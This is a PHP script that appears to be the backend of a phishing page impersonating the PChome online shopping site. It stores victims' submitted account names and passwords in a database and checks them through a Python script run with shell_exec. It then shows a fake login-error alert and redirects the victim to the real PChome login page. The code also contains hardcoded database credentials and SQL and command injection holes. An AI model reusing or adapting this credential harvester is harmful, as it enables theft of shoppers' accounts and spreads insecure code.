<?php
	$servername = "localhost";
	$username = "debian-sys-maint";
	$password = "kLkKvL5gWHVEsrVP";
	$dbname = "hacktest";

	$acc = $_POST['loginAcc'];
	$pwd = $_POST['loginPwd'];

	// Create connection
	$conn = new mysqli($servername, $username, $password, $dbname);
	//Check connection
	if ($conn->connect_error) {
		die("Connection failed: " . $conn->connect_error);
	}

	$sql = "INSERT INTO test (account, password)
	VALUES ('$acc', '$pwd')";

	if ($conn->query($sql) === TRUE) {
		#echo "You has been hacked!!"."</br>";
		#$facc = $acc;
		#$fpwd = $pwd;
		$str = $acc + " " + $pwd;
		#$file = fopen("./accpwd","w");
		#fwrite($file, $str);
		#fclose($file);
		
		$path = "python ./verification.py ";
		#exec("python /var/www/html/pchomelinux/a.py", $output);
		$check = shell_exec($path.$str);
		#foreach($output as $a){ echo $a; }
		if($check == "PChome 線上購物"){
			#echo $check
			echo "<script>alert('帳號密碼錯誤，請重新輸入');</script>";
			echo "<meta http-equiv='Refresh' content='0;URL=http://168.138.207.25/pchomelinux/PChome.php'>";
		}
		else if($check == "PChome 24h購物 - 購物車"){
			$sql = "INSERT INTO test (account, password) VALUES ('$acc', '$pwd')";
			echo "<script>alert('警告：載入頁面時發生意外，請重新登入');</script>";
			echo "<meta http-equiv='Refresh' content='0;URL=https://ecvip.pchome.com.tw/login/v3/login.htm?&rurl=https://ecssl.pchome.com.tw/sys/cflow/fsindex/BigCar/BIGCAR/ItemList'>";
		}

		#echo "<script>alert('警告：登入時發生意外，請重新登入');</script>";
		#echo "<meta http-equiv='Refresh' content='0;URL=https://ecvip.pchome.com.tw/login/v3/login.htm?&rurl=https://ecssl.pchome.com.tw/sys/cflow/fsindex/BigCar/BIGCAR/ItemList'>";
	} else {
		echo "Error: " . $sql . "<br>" . $conn->error;
	}

	$conn->close();
	//echo "account:".$acc."</br>";
	//echo "password:".$pwd."</br>";
?>
